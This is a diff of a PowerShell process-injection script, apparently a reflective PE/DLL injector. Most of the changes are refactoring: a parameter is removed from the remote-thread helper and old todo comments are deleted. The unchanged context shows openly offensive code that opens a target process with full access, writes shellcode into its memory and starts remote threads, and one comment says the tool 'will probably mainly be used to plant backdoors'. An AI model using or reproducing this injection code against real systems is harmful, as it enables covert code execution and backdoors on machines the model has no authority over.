@@ -1031,11 +1031,7 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 4, Mandatory = $true)]
 		[System.Object]
-		$Win32Functions,
-		
-		[Parameter(Position = 5, Mandatory = $true)]
-		[System.Object]
-		$Win32Types
+		$Win32Functions
 		)
 		
 		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
@@ -1299,7 +1295,7 @@ $RemoteScriptBlock = {
 				Throw "Unable to write shellcode to remote process memory."
 			}
 			
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1320,7 +1316,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions -Win32Types $Win32Types
+			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1450,8 +1446,7 @@ $RemoteScriptBlock = {
 			Throw "Unable to write shellcode to remote process memory."
 		}
 		
-		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
-		#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		if ($Result -ne 0)
 		{
@@ -2450,8 +2445,7 @@ $RemoteScriptBlock = {
 					Throw "Unable to write shellcode to remote process memory."
 				}
 
-				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
-				#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 				if ($Result -ne 0)
 				{
@@ -2588,15 +2582,14 @@ $RemoteScriptBlock = {
 		
 		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
 		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
-#		if ((Get-Process -Id $PID).SessionId -eq (Get-Process -Id $ProcId).SessionId) #todo fix this logic
+#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
 #		{
 #			Write-Verbose "Getting SeDebugPrivilege"
-#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants #todo remove priv when done? probably not
+#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
 #		}	
 		
 		if (($ProcId -ne $null) -and ($ProcId -ne 0))
 		{
-			#todo, call sedebugprivilege if needed
 			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
 			if ($RemoteProcHandle -eq [IntPtr]::Zero)
 			{
@@ -2693,8 +2686,7 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
 			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions -Win32Types $Win32Types
-			#todo delete$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]$VoidFuncAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
 		}
 		
 		#Don't free a library if it is injected in a remote process
